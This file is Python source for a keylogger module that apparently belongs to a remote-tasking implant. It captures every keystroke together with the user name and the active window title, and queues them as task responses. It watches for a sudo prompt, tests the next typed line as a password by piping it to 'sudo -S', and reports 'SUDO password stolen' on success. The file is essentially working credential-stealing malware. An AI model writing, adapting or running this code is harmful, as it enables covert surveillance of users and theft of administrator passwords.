def keylog(task_id):

    global responses   


    def get_active_window_title():
        root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
        stdout, stderr = root.communicate()

        m = re.search(b'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
        if m != None:
            window_id = m.group(1)
            window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
            stdout, stderr = window.communicate()
        else:
            return "None"

        match = re.match(b"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
        if match != None:
            return match.group("name").strip(b'"').decode()

        return "None"


    def keylogger():

        def on_press(key):
            global line
            global nextIsPsw
            global sudo
            global break_function

            if break_function:

                print("\t break detected, stopping keylog")

                response = {
                        "task_id": task_id,
                        "user": getpass.getuser(), 
                        "window_title": get_active_window_title(), 
                        "keystrokes": line,
                        "completed": True
                    }
                
                responses.append(response)
                line = ""
                break_function = False
                return False
            try:
                line = line + key.char
                k = key.char

            except:
                try:
                    k = key.name

                    if key.name == "backspace":
                        if len(line) > 0:
                            line = line[:-1]

                    elif key.name == "enter":

                        if nextIsPsw == True:

                            subprocess.call('echo ' + line + ' | sudo -S touch fileToCheckSudo', shell=True)

                            print("[FILE CREATO]: " + line)

                            with open('out.txt','w+') as fout:
                                with open('err.txt','w+') as ferr:
                                    out=subprocess.call(["ls",'fileToCheckSudo'],stdout=fout,stderr=ferr)
                                    fout.flush()
                                    ferr.flush()
                                    fout.close()
                                    ferr.close()

                            f = open("out.txt", "r")
                            output = f.read()
                            f.flush()
                            f.close()
                            os.remove("out.txt")
                            os.remove("err.txt")
                            os.remove("fileToCheckSudo")

                            if "fileToCheckSudo" in output:
                                response = {
                                        "task_id": task_id,
                                        "user_output": "SUDO password stolen: " + line,
                                        "user": getpass.getuser(),
                                        "window_title": window_title, 
                                        "keystrokes": line,
                                        "completed": True
                                    }
                                responses.append(response)
                                nextIsPsw == False
                                sudo = line
                                line = ""
                                return False
                            else:
                                print("[NO PASSWORD]")
                                nextIsPsw == False
                                                 

                        if 'sudospace' in line:
                            nextIsPsw = True


                        line = line + "\n"

                        response = {
                                "task_id": task_id,
                                "user": getpass.getuser(), 
                                "window_title": get_active_window_title(), 
                                "keystrokes": line,
                            }
                        responses.append(response)
                        line = ""
                    else:
                        line = line + key.name
                except:
                    pass
                
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()

    

    thread2 = threading.Thread(target=keylogger, args=())
    thread2.start()

    print("\t- Keylog Done")

line = ""
nextIsPsw = False